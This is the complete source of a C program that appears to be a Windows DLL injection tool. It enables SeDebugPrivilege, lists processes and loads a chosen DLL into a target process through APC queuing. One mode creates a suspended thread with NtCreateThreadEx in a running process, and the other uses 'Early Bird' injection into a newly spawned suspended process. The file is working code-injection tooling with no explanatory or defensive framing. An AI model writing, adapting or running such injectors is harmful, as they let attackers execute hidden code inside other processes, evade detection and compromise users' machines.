#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "advapi32.lib")
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <ctype.h>

#pragma comment(lib, "advapi32.lib")

typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
    OUT PHANDLE hThread,
    IN ACCESS_MASK DesiredAccess,
    IN PVOID ObjectAttributes,
    IN HANDLE ProcessHandle,
    IN PVOID lpStartAddress,
    IN PVOID lpParameter,
    IN ULONG Flags,
    IN SIZE_T StackZeroBits,
    IN SIZE_T SizeOfStackCommit,
    IN SIZE_T SizeOfStackReserve,
    OUT PVOID lpBytesBuffer
    );

typedef NTSTATUS(NTAPI* pNtTestAlert)();

BOOL EnableDebugPrivilege() {
    HANDLE hToken;
    LUID luid;
    TOKEN_PRIVILEGES tp;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) return FALSE;
    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) return FALSE;
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    return AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
}

BOOL IsNumeric(const char* s) {
    if (!s || !*s) return FALSE;
    for (int i = 0; s[i]; i++) if (!isdigit(s[i])) return FALSE;
    return TRUE;
}

void ListProcesses() {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return;
    PROCESSENTRY32 pe = { sizeof(pe) };
    printf("%-10s %s\n", "PID", "Process Name");
    if (Process32First(hSnapshot, &pe)) {
        do { printf("%-10lu %s\n", pe.th32ProcessID, pe.szExeFile); } while (Process32Next(hSnapshot, &pe));
    }
    CloseHandle(hSnapshot);
}

DWORD FindPotentialThread(DWORD pid) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;
    THREADENTRY32 te = { sizeof(te) };
    DWORD targetTid = 0;
    if (Thread32First(hSnapshot, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) {
                targetTid = te.th32ThreadID;
                break;
            }
        } while (Thread32Next(hSnapshot, &te));
    }
    CloseHandle(hSnapshot);
    return targetTid;
}

BOOL InjectViaAPC(HANDLE hProcess, HANDLE hThread, const char* dllPath) {
    size_t pathLen = strlen(dllPath) + 1;
    PVOID remoteMem = VirtualAllocEx(hProcess, NULL, pathLen, MEM_COMMIT, PAGE_READWRITE);
    if (!remoteMem) return FALSE;

    if (!WriteProcessMemory(hProcess, remoteMem, dllPath, pathLen, NULL)) return FALSE;

    PVOID pLoadLibraryA = (PVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");

    if (!QueueUserAPC((PAPCFUNC)pLoadLibraryA, hThread, (ULONG_PTR)remoteMem)) {
        return FALSE;
    }
    return TRUE;
}

int main(int argc, char* argv[]) {
    if (argc < 2) {
        ListProcesses();
        printf("\nUsage: %s <PID/Path> <DLL> [PrivEsc]\n", argv[0]);
        return 0;
    }

    if (argc < 3) {
        printf("[!] DLL path is required.\n");
        return 1;
    }

    if (argc >= 4) {
        if (EnableDebugPrivilege()) printf("[+] SeDebugPrivilege enabled.\n");
    }

    char* target = argv[1];
    char* dllPath = argv[2];

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");
    pNtTestAlert NtTestAlert = (pNtTestAlert)GetProcAddress(hNtdll, "NtTestAlert");

    if (IsNumeric(target)) {
        DWORD pid = (DWORD)atoi(target);
        printf("[*] Target PID: %lu\n", pid);

        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
        if (!hProcess) return printf("[!] OpenProcess failed.\n"), 1;

        DWORD tid = FindPotentialThread(pid);
        HANDLE hThread = tid ? OpenThread(THREAD_SET_CONTEXT | THREAD_QUERY_INFORMATION, FALSE, tid) : NULL;

     
        HANDLE hNewThread = NULL;
        PVOID pExitThread = (PVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "ExitThread");

        NTSTATUS status = NtCreateThreadEx(&hNewThread, THREAD_ALL_ACCESS, NULL, hProcess, pExitThread, NULL, 0x4, 0, 0, 0, NULL); // 0x4 = CREATE_SUSPENDED
        if (status == 0 && hNewThread) {
            if (InjectViaAPC(hProcess, hNewThread, dllPath)) {
                ResumeThread(hNewThread);
                printf("[+] Fallback thread resumed.\n");
            }
            CloseHandle(hNewThread);
         }
        CloseHandle(hProcess);
    }
    else {
        printf("[*] Mode: CreateProcess Early Bird\n");
        STARTUPINFOA si = { sizeof(si) };
        PROCESS_INFORMATION pi;
        if (CreateProcessA(target, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
            if (InjectViaAPC(pi.hProcess, pi.hThread, dllPath)) {
                ResumeThread(pi.hThread);
                printf("[+] Process %lu resumed with APC queued.\n", pi.dwProcessId);
            }
            else {
                TerminateProcess(pi.hProcess, 1);
            }
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
        }
        else {
            printf("[!] CreateProcess failed: %lu\n", GetLastError());
        }
    }

    return 0;
}